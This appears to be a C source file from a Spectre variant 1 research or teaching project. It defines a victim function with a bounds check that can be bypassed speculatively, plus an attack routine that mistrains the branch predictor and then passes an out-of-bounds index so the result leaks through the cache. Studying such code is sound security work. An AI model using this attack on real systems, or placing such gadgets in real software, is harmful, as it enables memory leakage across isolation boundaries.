#include "pht.h"
void victim_function(size_t x) {
  // precompute address
  char* addr = oracle_block + victim_block[x] *PAGESIZE;
  _mm_mfence();
  // a bounds check bypass: should not be able to access at 16 or above
  if ((float)x / (float)array1_size < 1.0) {
    maccess(addr);
  }
}

void pht_atk(size_t malicious_x){
    static size_t training_x;
    static int x, j;

    flush(oracle_block, PAGESIZE);
    _mm_mfence();
    training_x = 0;
    for (j = 30; j >= 0; j--) {
        _mm_clflush( & array1_size);
        for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

        /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
        /* Avoid jumps in case those tip off the branch predictor */
        x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
        x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
        x = training_x ^ (x & (malicious_x ^ training_x));

        /* Call the victim! */
        victim_function(x);
        _mm_mfence();
    }
}